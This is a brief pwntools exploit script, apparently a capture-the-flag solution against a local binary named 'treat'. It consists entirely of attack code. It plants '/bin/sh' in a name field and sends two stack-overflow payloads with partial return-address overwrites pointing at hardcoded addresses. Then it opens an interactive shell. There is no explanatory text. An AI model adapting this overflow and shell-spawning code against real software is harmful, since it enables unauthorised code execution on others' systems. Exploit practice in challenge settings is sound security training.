from pwn import *

###Addr
#  libc2.29
name_buf = 0x405080
func = 0x401186

###Exploit
r = process('./treat')

r.sendlineafter('name : ','TREAT=/bin/sh')
r.sendlineafter('(1~3) : ',b'1'*0x138+p64(name_buf)[:3])
r.sendlineafter('feedback : ',b'1'*0x48+p64(func)[:3])
r.interactive()
